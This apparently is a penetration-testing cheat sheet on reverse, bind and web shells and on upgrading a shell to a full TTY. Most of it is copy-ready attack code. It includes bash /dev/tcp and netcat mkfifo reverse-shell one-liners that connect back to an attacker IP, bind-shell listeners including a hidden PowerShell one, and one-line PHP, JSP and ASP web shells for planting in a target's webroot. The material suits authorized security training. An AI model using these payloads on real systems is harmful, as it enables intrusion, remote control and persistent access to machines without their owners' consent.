### Overview
- **Purpose**: To establish reliable remote access to a compromised system for enumeration, control, and further exploitation.
- **Main Types**:
    1. **Reverse Shell**: The target connects back to the attacker's system.
    2. **Bind Shell**: The target listens on a port; the attacker connects to it.
    3. **Web Shell**: Commands are executed via HTTP requests to a script hosted on the target.



### **1. Reverse Shell**
- **Description**: The compromised system connects back to the attacker.
- **Setup**:
    1. Start a **Netcat Listener**:
        ```bash
        nc -lvnp 1234
        ```
        - `-l`: Listen mode.
        - `-v`: Verbose output.
        - `-n`: Disable DNS resolution.
        - `-p`: Specify the listening port.
    2. Determine the attacker's IP (e.g., via `ip a`).
    3. Execute a reverse shell payload on the target.
- **Example Payloads**:    
    - **Linux (Bash)**:
        ```bash
        bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
        ```
    - **Windows (PowerShell)**:
        ```powershell
        powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);..."
        ```
    - **Netcat**:
        ```bash
        rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 1234 >/tmp/f
        ```
- **Strengths**:
    - Quick and easy to set up.
- **Limitations**:
    - Connection is fragile; needs re-exploitation if lost.



### **2. Bind Shell**
- **Description**: The compromised system listens on a port for incoming connections.
- **Setup**:
    1. Execute a bind shell payload on the target.
    2. Connect to the target using **Netcat**:    
        ```bash
        nc <target_ip> 1234
        ```
- **Example Payloads**:
    - **Linux (Bash)**:
        ```bash
        rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 1234 >/tmp/f
        ```
    - **Python**:
        ```python
        python -c 'import socket as s,subprocess as sp;...'
        ```
    - **Windows (PowerShell)**:
        ```powershell
        powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; ...
        ```
- **Strengths**:
    - Persistent; allows reconnection without re-exploitation.
- **Limitations**:
    - May require open inbound ports, which could be firewalled.



### **3. Web Shell**
- **Description**: Commands are executed through HTTP parameters sent to a web script hosted on the target.
- **Setup**:
    1. Write a web shell script in the target's webroot directory.
    2. Example Web Shell Scripts:
        - **PHP**:
            ```php
            <?php system($_REQUEST["cmd"]); ?>
            ```
        - **JSP**:
            ```jsp
            <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
            ```
        - **ASP**:
            ```asp
            <% eval request("cmd") %>
            ```
    3. Access the web shell through a browser or `curl`:
        ```bash
        curl http://<target_ip>:<port>/shell.php?cmd=id
        ```
- **Strengths**:
    - Persistent; remains functional even after a reboot.
    - Bypasses firewall restrictions by using web server ports (80/443).
- **Limitations**:
    - Not interactive; requires automation for semi-interactive use.



### **Upgrading Shells**
- **Purpose**: Improve interactivity by upgrading a raw shell to a full TTY shell.
- **Steps**:
    1. Use Python to spawn a TTY:
        ```bash
        python -c 'import pty; pty.spawn("/bin/bash")'
        ```
    2. Background the shell (`CTRL+Z`) and adjust terminal settings:
        ```bash
        stty raw -echo
        fg
        ```
	    - Press `[Enter]` to resume.
    3. Set terminal environment:
        ```bash
        export TERM=xterm-256color
        stty rows <rows> columns <columns>
        ```
        


### Comparison of Shell Types

|**Shell Type**|**Strengths**|**Limitations**|
|---|---|---|
|**Reverse Shell**|Quick setup, works behind firewalls/NAT.|Fragile; requires re-exploitation if disconnected.|
|**Bind Shell**|Persistent; reconnect without re-exploitation.|Requires open ports; inbound connections might be blocked.|
|**Web Shell**|Persistent; bypasses firewalls; uses existing web ports.|Non-interactive; requires repeated requests or automation.|
